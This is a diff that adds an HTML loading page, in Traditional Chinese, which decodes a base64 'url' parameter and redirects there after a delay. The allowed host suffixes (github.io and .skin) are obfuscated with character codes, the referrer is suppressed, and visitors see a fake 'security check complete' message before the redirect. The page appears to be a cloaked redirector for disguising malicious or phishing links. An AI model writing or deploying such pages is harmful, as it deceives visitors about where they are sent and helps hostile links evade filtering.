@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="referrer" content="no-referrer">
+  <title></title>
+  <style>
+    #load {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255, 255, 255, 0.95);
+      display: flex; justify-content: center; align-items: center;
+      z-index: 9999; flex-direction: column; text-align: center;
+      font-family: sans-serif;
+    }
+    .kz { display: flex; gap: 12px; margin-bottom: 16px; }
+    .pz { width: 16px; height: 16px; border-radius: 50%; animation: xb 0.6s infinite alternate; }
+    .pz:nth-child(1){ background:#e91e63; animation-delay:0s;}
+    .pz:nth-child(2){ background:#2196f3; animation-delay:.2s;}
+    .pz:nth-child(3){ background:#f9d402; animation-delay:.4s;}
+    @keyframes xb {from{transform:translateY(0);opacity:.6;} to{transform:translateY(-15px);opacity:1;}}
+    #prompt { display:none; font-size:16px; color:#333; }
+  </style>
+</head>
+<body>
+  <div id="load">
+    <div class="kz">
+      <div class="pz"></div>
+      <div class="pz"></div>
+      <div class="pz"></div>
+    </div>
+    <div id="prompt">🔎 請稍候...</div>
+  </div>
+
+  <script>
+    (function(){
+      function g(p){return new URLSearchParams(window.location.search).get(p);}
+      function c(u){
+        try{
+          var h=(new URL(u)).hostname.toLowerCase();
+          var s1=String.fromCharCode(103,105,116,104,117,98,46,105,111); 
+          var s2=String.fromCharCode(46,115,107,105,110);               
+          return h.endsWith(s1)||h.endsWith(s2);
+        }catch(e){return false;}
+      }
+      var r=g('url'), prompt=document.getElementById('prompt');
+      if(r){
+        try{
+          var t=atob(r);
+          if(c(t)){
+            prompt.style.display='block';
+            setTimeout(function(){
+              prompt.innerHTML='✅ 安全檢測完成，正在跳轉...';
+              window.location.href=t;
+            },2530+Math.random()*1000);
+          }else{
+            prompt.style.display='block';
+           
+          }
+        }catch(e){
+          prompt.innerHTML='<p>⚠️ 無效的跳轉參數。</p>';
+        }
+      }else{
+        prompt.innerHTML='<p>⚠️ 缺少跳轉連結。</p>';
+      }
+    })();
+  </script>
+</body>
+</html>
